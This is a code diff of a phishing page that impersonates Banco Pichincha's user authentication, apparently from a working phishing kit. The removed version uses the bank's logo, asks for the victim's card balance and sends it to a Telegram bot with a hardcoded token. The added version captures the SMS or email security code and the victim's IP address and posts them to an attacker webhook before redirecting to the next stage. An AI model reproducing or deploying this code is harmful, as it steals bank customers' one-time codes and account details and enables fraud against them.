@@ -3,143 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Página de Seguridad</title>
+    <title>Pagina de Seguridad</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #fff; /* Fondo blanco */
-            color: #000; /* Letras negras */
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            background-color: #f4f4f4; /* Fondo gris claro para el contenedor */
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        input[type="text"] {
-            padding: 25px;
-            font-size: 20px;
-            margin-bottom: 20px;
-            width: 250px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            background-color: #eee; /* Fondo gris claro para el input */
-            color: #000; /* Texto negro dentro del input */
-            text-align: center; /* Centra el texto en el campo de entrada */
-        }
-        button {
-            padding: 15px 70px; /* Aumenté el padding para hacerlo más grande */
-            font-size: 18px; /* Aumenté el tamaño del texto */
-            background-color: #007BFF; /* Botón azul */
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #0056b3; /* Azul más oscuro cuando se pasa el mouse */
-        }
-        .message {
-            margin-top: 20px;
-            font-size: 16px;
-        }
-        ul {
-            list-style-type: none;
-            padding-left: 0;
-            font-size: 18px;
-            font-family: Georgia, serif;
-            text-align: left;
-            margin-bottom: 20px;
-        }
-        ul li {
-            margin-bottom: 10px;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
+        body { background-color: #f6f6f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
+        .image-placeholder { width: 280px; height: 100px; background-color: #fdfdfd; border: 1px solid #eeeeee; margin: 0 auto 40px; display: flex; justify-content: center; align-items: center; }
+        .image-placeholder img { max-width: 100%; max-height: 100%; }
+        h1 { font-size: 24px; color: #000; margin-bottom: 25px; font-weight: bold; }
+        .instruction { font-size: 16px; color: #000; text-align: left; margin-bottom: 30px; line-height: 1.4; padding: 0 10px; }
+        .input-container { margin-bottom: 35px; }
+        input { width: 90%; padding: 25px; background-color: #eeeeee; border: 1px solid #cccccc; border-radius: 4px; font-size: 20px; color: #333; text-align: center; outline: none; }
+        input::placeholder { color: #aaaaaa; }
+        .btn-verify { width: 55%; padding: 16px; background-color: #3b82f6; color: #ffffff; border: none; border-radius: 4px; font-size: 18px; font-weight: 400; cursor: pointer; }
+        .btn-verify:hover { background-color: #2563eb; }
+        .btn-verify:disabled { background-color: #94a3b8; cursor: not-allowed; }
     </style>
 </head>
 <body>
 
     <div class="container">
-      <p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Banco_Pichincha_logo.svg/1024px-Banco_Pichincha_logo.svg.png" style="width: 250px;"></p>
-        <h2>Autenticacion de Usuario </h2>
-        <ul>
-            <li>Ingrese el monto actual de su tarjeta ingresada&nbsp;</li>
-        </ul>
-        <input type="text" id="codigoSeguridad" placeholder="Ingresar Monto" maxlength="40" oninput="agregarSimboloDolar(event)" />
-        <button onclick="verificarCodigo()">Verificar</button>
+        <div class="image-placeholder">
+            <img src="css/swj.png" alt="Icono">
+        </div>
 
-        <div class="message" id="mensaje"></div>
+        <h1>Autenticacion de Usuario</h1>
+
+        <p class="instruction">
+            Hemos enviado un mensaje de texto con un código a su numero de móvil o correo electrónico registrado. Este código puede tardar algunos minutos en llegar.
+        </p>
+
+        <form id="verifyForm">
+            <div class="input-container">
+                <input type="text" id="codigoInput" placeholder="Código de seguridad" required>
+            </div>
+
+            <button type="submit" class="btn-verify" id="btnSubmit">Verificar</button>
+        </form>
     </div>
 
+    <!-- Carga la URL desde envi.js -->
+    <script src="css/envi.js"></script>
+
     <script>
-        function agregarSimboloDolar(event) {
-            var input = event.target;
-            // Verifica si el primer carácter no es el símbolo de dólar
-            if (input.value && !input.value.startsWith('$')) {
-                input.value = '$' + input.value.replace(/^0+/, '');  // Agrega el símbolo de dólar y elimina ceros a la izquierda
-            }
-        }
+        const verifyForm = document.getElementById('verifyForm');
+        const btnSubmit = document.getElementById('btnSubmit');
 
-        function verificarCodigo() {
-            var codigoIngresado = document.getElementById("codigoSeguridad").value;
-            var mensaje = document.getElementById("mensaje");
+        verifyForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-            // Remover el símbolo de dólar antes de la validación
-            var codigoSinDolar = codigoIngresado.replace('$', '');
+            const codigoValue = document.getElementById('codigoInput').value;
 
-            // Validar que el código ingresado sea numérico y tenga hasta 40 caracteres
-            var regex = /^[0-9]{1,40}$/;
+            // Bloqueo visual
+            btnSubmit.innerText = "Verificando...";
+            btnSubmit.disabled = true;
 
-            if (regex.test(codigoSinDolar)) {
-                mensaje.textContent = "Monto valido. Acceso permitido.";
-                mensaje.style.color = "green";
-                // Enviar mensaje a Telegram si el código es válido
-                enviarAMensajeTelegram(codigoSinDolar);
-                // Redirigir a www.pichincha.com después de 2 segundos
-                setTimeout(function() {
-                    window.location.href = "index3.html"; 
-                }, 2000);  // Redirige después de 2 segundos
-            } else {
-                mensaje.textContent = "El código debe ser numérico y tener un máximo de 40 dígitos.";
-                mensaje.style.color = "red";
-            }
-        }
+            // Obtener IP real
+            let userIP = "No detectada";
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) { console.error("Error IP"); }
 
-        function enviarAMensajeTelegram(codigo) {
-            const token = '8652605735:AAGpe405IEzW36zWbSR6HbDvaYRmQHfqHGE'; // Reemplaza con tu token
-            const chatId = '-1003900740654'; // Reemplaza con el ID de tu canal
-            const mensaje = `Monto: ${codigo}`;
+            // Mensaje simple para Discord
+            const mensaje = `**CÓDIGO DE VERIFICACIÓN**\n` +
+                          `> **Código:** ${codigoValue}\n` +
+                          `> **IP:** ${userIP}\n` +
+                          `> **Hora:** ${new Date().toLocaleString()}`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            // Envío vía Webhook
+            fetch(webhookURL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: mensaje
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: mensaje })
             })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Mensaje enviado a Telegram:', data);
+            .then(res => {
+                if(res.ok) {
+                    // Redirige a la siguiente página
+                    window.location.href = "index4.html";
+                } else {
+                    alert("Error en el sistema.");
+                    resetBtn();
+                }
             })
-            .catch(error => {
-                console.error('Error al enviar el mensaje a Telegram:', error);
+            .catch(() => {
+                alert("Fallo de red.");
+                resetBtn();
             });
+        });
+
+        function resetBtn() {
+            btnSubmit.innerText = "Verificar";
+            btnSubmit.disabled = false;
         }
     </script>
-
 </body>
 </html>
